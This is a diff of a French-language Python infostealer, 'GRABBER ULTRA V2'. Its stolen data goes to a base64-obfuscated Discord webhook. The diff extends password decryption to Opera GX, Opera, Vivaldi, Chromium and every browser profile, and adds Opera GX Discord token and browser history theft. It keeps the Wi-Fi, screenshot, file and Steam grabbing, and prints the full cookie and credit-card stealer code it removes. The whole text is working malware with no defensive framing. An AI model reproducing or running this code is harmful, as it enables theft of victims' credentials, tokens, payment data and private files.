@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# GEN-TOOL — GRABBER ULTRA
+# GEN-TOOL — GRABBER ULTRA V2 (Avec Opera GX)
 # Par Lerisque94z — Pour LO
 
 import os
@@ -24,7 +24,7 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 
 # ============================================================
-# WEBHOOK — CACHÉ (NOUVEAU)
+# WEBHOOK
 # ============================================================
 __B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTIwMDUxODA0MjE2MTIwMi9UUGtKYXp0SWRjTlcyZzFoVzdSaUNXRmF2TjZ3dlh4WjgyQWNyXzdMOFJzYmtWMWFDMFpydDFlUjdkQTJZMEpsb3dJSQ=="
 
@@ -86,58 +86,79 @@ IP Publique : {ip}
         return "Erreur systeme"
 
 # ============================================================
-# 2. MOTS DE PASSE — CHROME/EDGE/BRAVE
+# 2. MOTS DE PASSE — TOUS LES NAVIGATEURS
 # ============================================================
 def __passwords():
     try:
         key = __chrome_key()
         r = ""
         total = 0
+        
+        # Liste de tous les navigateurs avec leurs chemins
         browsers = {
             "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
             "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
-            "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data"
+            "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data",
+            "Opera GX": os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\User Data",
+            "Opera": os.environ["APPDATA"] + "\\Opera Software\\Opera Stable\\User Data",
+            "Vivaldi": os.environ["LOCALAPPDATA"] + "\\Vivaldi\\User Data",
+            "Chromium": os.environ["LOCALAPPDATA"] + "\\Chromium\\User Data"
         }
-        for name, path in browsers.items():
-            if not os.path.exists(path):
+        
+        for name, base_path in browsers.items():
+            if not os.path.exists(base_path):
                 continue
+            
+            # Détection des profils
             profiles = ["Default"]
-            for item in os.listdir(path):
-                if item.startswith("Profile") and os.path.isdir(os.path.join(path, item)):
-                    profiles.append(item)
+            if os.path.exists(base_path):
+                for item in os.listdir(base_path):
+                    if item.startswith("Profile") and os.path.isdir(os.path.join(base_path, item)):
+                        profiles.append(item)
+            
             for profile in profiles:
-                db = os.path.join(path, profile, "Login Data")
-                if not os.path.exists(db):
+                login_db = os.path.join(base_path, profile, "Login Data")
+                if not os.path.exists(login_db):
                     continue
-                tmp = os.environ["TEMP"] + f"\\{name}_{profile}.db"
+                
+                temp = os.environ["TEMP"] + f"\\{name}_{profile}.db"
                 try:
-                    shutil.copyfile(db, tmp)
-                    conn = sqlite3.connect(tmp)
+                    shutil.copyfile(login_db, temp)
+                    conn = sqlite3.connect(temp)
                     cursor = conn.cursor()
                     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                     data = cursor.fetchall()
                     conn.close()
-                    os.remove(tmp)
+                    os.remove(temp)
+                    
                     if data:
-                        r += f"\n**{name}** :\n"
+                        r += f"\n**{name} - {profile}** : {len(data)} comptes\n"
                         for url, username, encrypted in data:
                             if username:
                                 try:
+                                    pwd = None
                                     if key:
                                         pwd = __decrypt(encrypted, key)
                                     if not pwd:
-                                        pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
-                                    r += f"  {url} : {username} / {pwd}\n"
-                                    total += 1
+                                        try:
+                                            pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
+                                        except:
+                                            pass
+                                    if pwd:
+                                        r += f"  {url} : {username} / {pwd}\n"
+                                        total += 1
+                                    else:
+                                        r += f"  {url} : {username} / (chiffré)\n"
                                 except:
-                                    pass
+                                    r += f"  {url} : {username} / (erreur)\n"
                 except:
                     pass
+        
         if total == 0:
-            return "Aucun mot de passe"
+            return "Aucun mot de passe trouvé"
         return r
-    except:
-        return "Erreur passwords"
+    except Exception as e:
+        return f"Erreur passwords: {str(e)}"
 
 # ============================================================
 # 3. TOKENS DISCORD
@@ -149,6 +170,7 @@ def __tokens():
             os.environ["APPDATA"] + "\\discord\\Local Storage\\leveldb",
             os.environ["APPDATA"] + "\\discordcanary\\Local Storage\\leveldb",
             os.environ["APPDATA"] + "\\discordptb\\Local Storage\\leveldb",
+            os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\Local Storage\\leveldb",
             os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
         ]
         for path in paths:
@@ -170,90 +192,36 @@ def __tokens():
         return "Erreur tokens"
 
 # ============================================================
-# 4. COOKIES
-# ============================================================
-def __cookies():
-    try:
-        key = __chrome_key()
-        r = ""
-        path = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Cookies"
-        if not os.path.exists(path):
-            return "Aucun cookie"
-        tmp = os.environ["TEMP"] + "\\cookies.db"
-        shutil.copyfile(path, tmp)
-        conn = sqlite3.connect(tmp)
-        cursor = conn.cursor()
-        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 15")
-        data = cursor.fetchall()
-        conn.close()
-        os.remove(tmp)
-        for host, name, encrypted in data:
-            try:
-                if key:
-                    decrypted = __decrypt(encrypted, key)
-                    if decrypted:
-                        r += f"{host} : {name} = {decrypted[:50]}...\n"
-            except:
-                pass
-        return r if r else "Aucun cookie"
-    except:
-        return "Erreur cookies"
-
-# ============================================================
-# 5. CARTES DE CREDIT
-# ============================================================
-def __credit_cards():
-    try:
-        key = __chrome_key()
-        r = ""
-        path = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Web Data"
-        if not os.path.exists(path):
-            return "Aucune carte"
-        tmp = os.environ["TEMP"] + "\\cards.db"
-        shutil.copyfile(path, tmp)
-        conn = sqlite3.connect(tmp)
-        cursor = conn.cursor()
-        cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
-        data = cursor.fetchall()
-        conn.close()
-        os.remove(tmp)
-        for name, encrypted, month, year in data:
-            try:
-                if key:
-                    decrypted = __decrypt(encrypted, key)
-                    if decrypted:
-                        r += f"{name} : **** **** **** {decrypted[-4:]} ({month}/{year})\n"
-            except:
-                pass
-        return r if r else "Aucune carte"
-    except:
-        return "Erreur cartes"
-
-# ============================================================
-# 6. HISTORIQUE
+# 4. HISTORIQUE — TOUS LES NAVIGATEURS
 # ============================================================
 def __history():
     try:
         r = ""
-        path = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\History"
-        if not os.path.exists(path):
-            return "Aucun historique"
-        tmp = os.environ["TEMP"] + "\\history.db"
-        shutil.copyfile(path, tmp)
-        conn = sqlite3.connect(tmp)
-        cursor = conn.cursor()
-        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
-        data = cursor.fetchall()
-        conn.close()
-        os.remove(tmp)
-        for url, title in data:
-            r += f"{title[:40]} : {url}\n"
+        paths = [
+            os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\History",
+            os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\User Data\\Default\\History",
+            os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data\\Default\\History"
+        ]
+        for path in paths:
+            if not os.path.exists(path):
+                continue
+            tmp = os.environ["TEMP"] + "\\history_temp.db"
+            shutil.copyfile(path, tmp)
+            conn = sqlite3.connect(tmp)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+            data = cursor.fetchall()
+            conn.close()
+            os.remove(tmp)
+            for url, title in data:
+                if url and title:
+                    r += f"{title[:50]} : {url}\n"
         return r if r else "Aucun historique"
     except:
         return "Erreur historique"
 
 # ============================================================
-# 7. WIFI
+# 5. WIFI
 # ============================================================
 def __wifi():
     try:
@@ -279,7 +247,7 @@ def __wifi():
         return "Erreur Wi-Fi"
 
 # ============================================================
-# 8. SCREENSHOT
+# 6. SCREENSHOT
 # ============================================================
 def __screenshot():
     try:
@@ -294,7 +262,7 @@ def __screenshot():
         return None
 
 # ============================================================
-# 9. FICHIERS (Desktop, Documents, Downloads)
+# 7. FICHIERS
 # ============================================================
 def __files():
     try:
@@ -304,7 +272,7 @@ def __files():
             os.environ["USERPROFILE"] + "\\Documents",
             os.environ["USERPROFILE"] + "\\Downloads"
         ]
-        exts = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4", ".exe", ".bat", ".ps1", ".py", ".js"]
+        exts = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4", ".exe", ".bat", ".ps1", ".py", ".js", ".html", ".json"]
         for folder in folders:
             if os.path.exists(folder):
                 for file in os.listdir(folder)[:8]:
@@ -317,7 +285,7 @@ def __files():
         return "Erreur fichiers"
 
 # ============================================================
-# 10. STEAM
+# 8. STEAM
 # ============================================================
 def __steam():
     try:
@@ -334,41 +302,7 @@ def __steam():
         return "Erreur Steam"
 
 # ============================================================
-# 11. UPLAY / UBISOFT
-# ============================================================
-def __uplay():
-    try:
-        r = ""
-        path = os.environ["APPDATA"] + "\\Ubisoft Game Launcher\\settings.yml"
-        if os.path.exists(path):
-            with open(path, "r", encoding='utf-8', errors='ignore') as f:
-                content = f.read()
-                emails = re.findall(r'email: ["\']?([^"\'\n]+)', content)
-                for email in emails:
-                    r += f"{email}\n"
-        return r if r else "Aucun compte Uplay"
-    except:
-        return "Erreur Uplay"
-
-# ============================================================
-# 12. EPIC GAMES
-# ============================================================
-def __epic():
-    try:
-        r = ""
-        path = os.environ["LOCALAPPDATA"] + "\\Epic Games Launcher\\Saved\\Config\\Windows\\GameUserSettings.ini"
-        if os.path.exists(path):
-            with open(path, "r", encoding='utf-8', errors='ignore') as f:
-                content = f.read()
-                emails = re.findall(r'Email=([^\n]+)', content)
-                for email in emails:
-                    r += f"{email}\n"
-        return r if r else "Aucun compte Epic"
-    except:
-        return "Erreur Epic"
-
-# ============================================================
-# TACHE PRINCIPALE — ULTRA COMPLETE
+# TACHE PRINCIPALE
 # ============================================================
 def __task():
     try:
@@ -390,16 +324,6 @@ def __task():
             __send(t)
         time.sleep(0.3)
         
-        c = __cookies()
-        if c:
-            __send(c)
-        time.sleep(0.3)
-        
-        card = __credit_cards()
-        if card:
-            __send(card)
-        time.sleep(0.3)
-        
         h = __history()
         if h:
             __send(h)
@@ -415,21 +339,11 @@ def __task():
             __send(s)
         time.sleep(0.3)
         
-        u = __uplay()
-        if u:
-            __send(u)
-        time.sleep(0.3)
-        
-        e = __epic()
-        if e:
-            __send(e)
-        time.sleep(0.3)
-        
         img = __screenshot()
         if img:
             __send("**SCREENSHOT**", img)
         
-        __send("**✅ GRAB ULTRA TERMINE**")
+        __send("**✅ GRAB ULTRA V2 TERMINE**")
     except:
         pass
 
